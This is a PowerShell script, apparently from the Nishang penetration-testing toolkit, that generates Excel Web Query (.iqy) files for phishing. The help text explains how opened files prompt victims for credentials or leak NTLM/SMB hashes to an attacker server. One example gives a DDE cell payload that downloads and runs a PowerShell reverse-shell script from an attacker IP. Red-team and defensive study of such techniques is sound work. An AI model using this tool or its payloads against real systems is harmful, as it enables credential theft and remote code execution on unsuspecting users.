function Out-WebQuery
{
<#
.SYNOPSIS
Nishang script which creates a Web Query (.iqy) file which can be used for phishing attacks.

.DESCRIPTION
The script generates a Web Query (.iqy). When a target opens the file, it is opened inside an Excel Sheet and the
user is presented with a warning for enabling data connection. If the user allows it, he is presented with a prompt 
which asks for credentials. As soon as the user enters the credentials, it is sent to the remote server specified 
while generating the file.

The attacker must run a web server which is able to log the requests made to it by the targets. While any regular web
server can be used, Start-CaptureServer.ps1 in the Utility directory of Nishang could be used as well. Start-CaptureServer
supports Basic auth for capturing credentials in plain and NTLM authentication for capturing hashes.

The WebQuery file can also be used for DDE attacks and thus command execution on the target. See examples for more. 

.PARAMETER URL
URL to which the connection from the target is made. A web server which logs requests must run at this URL.

.PARAMETER Message
Message which will be shown to the user after he enables the Data Connection.

.PARAMETER OutputPath
Path to the .iqy file to be generated. Default is with the name QueryData.iqy in the current directory.

.EXAMPLE
PS > Out-WebQuery -URL http://192.168.1.2/

Use above command to generate a Web Query file. When a user opens it and enables data connection, 
a credentials prompt will be shown to him. The credentials entered could be captured on the listener machine
using Start-CaptureServer script from Nishang.

To capture credentials in plain, run below command on the attacker's machine:
Start-CaptureServer -AuthType Basic -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt

To capture hashes
Start-CaptureServer -AuthType NTLM2 -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt

PS > Out-WebQuery -URL \\192.168.1.2\C$

Use above command to generate a Web Query file. When a user opens it, his SMB hash would be captured
on the attacker's machine where Start-CaptureServer is running.

PS > Out-WebQuery -URL http://192.168.230.1/calc.html
Use above command to generate a Web Query file. When a user opens it, the contents of calc.html are loaded.
The contents of calc.html can be used for command execution:
=cmd|'/c powershell iex(New-Object Net.WebClient).DownloadString(''http://192.168.230.1/Invoke-PowerShellTcpOneLine.ps1'') '!A0


.LINK
http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
https://github.com/samratashok/nishang
https://twitter.com/subTee/status/631509345918783489
https://twitter.com/curi0usJack/status/886054701413933060
https://support.microsoft.com/en-us/kb/157482
#>
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $OutputPath = "$pwd\QueryData.iqy"

    )
    $iqycontent = @"
WEB 
1 
$URL
"@

    Out-File -FilePath $OutputPath -InputObject $iqycontent -Encoding ascii
    Write-Output "The Web Query file has been written as $OutputPath"

}

